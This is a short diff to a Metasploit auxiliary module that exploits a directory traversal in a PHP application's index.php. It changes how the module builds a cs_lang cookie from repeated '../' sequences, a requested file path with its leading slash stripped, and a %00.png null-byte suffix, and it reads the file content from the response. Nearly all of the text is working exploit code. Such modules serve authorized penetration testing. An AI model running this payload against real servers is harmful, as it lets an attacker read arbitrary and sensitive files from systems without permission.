@@ -51,11 +51,15 @@ class Metasploit3 < Msf::Auxiliary
 		peer = "#{ip}:#{rport}"
 
 		print_status("#{peer} - Reading '#{datastore['FILE']}'")
+
 		traverse = "../" * datastore['DEPTH']
+		f = datastore['FILE']
+		f = f[1, f.length] if f =~ /^\//
+
 		res = send_request_cgi({
 			'method' => 'GET',
 			'uri'    => "#{base}index.php",
-			'cookie' => "blah=blah; cs_lang=#{traverse}#{datastore['FILE']}%00.png"
+			'cookie' => "blah=blah; cs_lang=#{traverse}#{f}%00.png"
 		})
 
 		if res and res.body =~ /^Fatal error\:/
